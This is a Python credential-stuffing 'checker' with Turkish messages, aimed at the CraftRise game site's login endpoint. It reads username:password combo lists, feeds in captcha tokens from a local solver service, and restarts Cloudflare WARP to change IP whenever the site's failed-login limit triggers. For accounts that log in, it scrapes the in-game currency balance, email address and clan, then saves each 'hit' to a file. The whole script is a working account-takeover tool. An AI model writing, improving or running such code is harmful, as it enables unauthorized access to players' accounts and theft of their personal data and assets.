
import requests
from bs4 import BeautifulSoup
import threading
import time
import subprocess
import json

hit_file = "hit.txt"
token_lock = threading.Lock()

def restart_warp():
    try:
        print("🔁 WARP yeniden başlatılıyor (check.py)...")
        subprocess.run(["warp-cli", "disconnect"], check=True)
        time.sleep(3)
        subprocess.run(["warp-cli", "connect"], check=True)
        print("✅ WARP bağlantısı yeniden kuruldu.")
        time.sleep(5)  # Bağlantı sonrası sistemin oturması için bekle
    except Exception as e:
        print(f"❌ WARP reset hatası (check.py): {e}")

def get_token_safely(session):
    with token_lock:
        try:
            response = session.get("http://127.0.0.1:5001/get-token", timeout=10)
            response.raise_for_status()
            token_json = response.json()
            token = token_json.get("token")
            if not token:
                raise ValueError("Token değeri boş döndü.")
            return token
        except Exception as e:
            raise RuntimeError(f"Token alınamadı: {e}")

def login_and_scrape(username, password, idx):
    session = requests.Session()
    result = {
        "ulog": username,
        "password": password,
        "result": "Unknown error",
        "rc": None,
        "email": None,
        "reg_date": None,
        "clan": None
    }

    try:
        cf_response = get_token_safely(session)
        session.get('https://www.craftrise.com.tr/')
        PHPSESSID = session.cookies.get('PHPSESSID')
        if not PHPSESSID:
            raise ValueError("PHPSESSID alınamadı.")

        login_url = "https://www.craftrise.com.tr/posts/post-login.php"
        headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Cookie": f"PHPSESSID={PHPSESSID}",
            "User-Agent": "Mozilla/5.0",
            "X-Requested-With": "XMLHttpRequest",
            "Referer": "https://www.craftrise.com.tr/"
        }
        data = {
            "value": username,
            "password": password,
            "grecaptcharesponse": cf_response
        }

        response = session.post(login_url, headers=headers, data=data)
        response.raise_for_status()
        login_response = response.json()
        result["result"] = login_response.get("resultMessage", "No message")
        result_type = login_response.get("resultType", "error")

        if result["result"] == "Çok fazla hatalı giriş yaptınız.":
            print(f"[{idx}] {username}:{password} => ⚠️ Rate limit algılandı, WARP resetlenecek...")
            restart_warp()

        if result_type != "error":
            rc_page = session.get("https://www.craftrise.com.tr/shop", headers=headers)
            soup = BeautifulSoup(rc_page.text, "html.parser")
            rc_element = soup.find('span', class_='rcCount')
            result["rc"] = rc_element.text.strip() if rc_element else "N/A"

            profile_page = session.get("https://www.craftrise.com.tr/profil", headers=headers)
            soup = BeautifulSoup(profile_page.text, 'html.parser')
            user_mail = soup.find(id='userMail')
            rise_date = soup.find(class_='riseDate')
            clan_name = soup.find(id='clanName')

            def get_element_value(element):
                if element:
                    return element.get('value') or element.text.strip()
                return "N/A"

            result["email"] = get_element_value(user_mail)
            result["reg_date"] = get_element_value(rise_date)
            result["clan"] = clan_name.get('placeholder') if clan_name else "N/A"

            with open(hit_file, "a", encoding="utf-8") as f:
                f.write(f"{username}:{password} | RC: {result['rc']} | Mail: {result['email']} | Klan: {result['clan']}\n")


        print(f"[{idx}] {username}:{password} => {result['result']} | RC: {result['rc']} | E-Mail: {result['email']} | Klan: {result['clan']}")
    except Exception as e:
        print(f"[{idx}] {username}:{password} => ❌ HATA: {str(e)}")

def main():
    threads = []

    try:
        with open("sa.txt", "r", encoding="utf-8") as f:
            accounts = [line.strip().split(":", 1) for line in f if ":" in line]

        for idx, (username, password) in enumerate(accounts, 1):
            t = threading.Thread(target=login_and_scrape, args=(username, password, idx))
            t.start()
            threads.append(t)
            time.sleep(6)

        for t in threads:
            t.join()

    except FileNotFoundError:
        print("❌ HATA: 'sa.txt' dosyası bulunamadı.")
    except Exception as e:
        print(f"❌ Genel Hata: {e}")

if __name__ == "__main__":
    main()
